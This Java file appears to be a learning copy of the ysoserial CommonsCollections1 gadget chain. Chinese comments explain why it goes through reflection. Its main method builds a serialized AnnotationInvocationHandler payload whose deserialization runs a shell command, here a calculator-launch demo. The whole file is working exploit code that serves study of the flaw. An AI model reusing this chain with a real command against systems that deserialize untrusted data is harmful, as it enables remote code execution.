package ysoserial.payloads.forlearn;

import clojure.lang.Obj;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections1_Simple_TransformedMap {

    /**
     * CC1 gadget 为了方便理解原理的简化版方法
     */
    private static void simple() {
        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.getRuntime()),
            new InvokerTransformer("exec",
                new Class[]{String.class},
                new Object[]{"open -a Calculator"}),
        };

        Transformer transformerChain = new ChainedTransformer(transformers);

        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        outerMap.put("test", "xxxx");
    }

    public static void main(String[] args) {
        try {
            Transformer[] transformers = new Transformer[]{
                //Runtime类没有实现 java.io.Serializable 接口，
                //   所以不能被序列化，所以得换以下这种方式
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                    new Class[]{String.class, Class[].class},
                    new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer("invoke",
                    new Class[]{Object.class, Object[].class},
                    new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer("exec",
                    new Class[]{String.class},
                    new Object[]{"open -a Calculator"}
                ),
            };

            Transformer transformerChain = new ChainedTransformer(transformers);

            Map innerMap = new HashMap();
            Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
            innerMap.put("value", "xxxx");

            Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
            constructor.setAccessible(true);
            InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Retention.class, outerMap);

            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(invocationHandler);
            System.out.println(baos.toString());

            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray()));
            Object o = ois.readObject();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
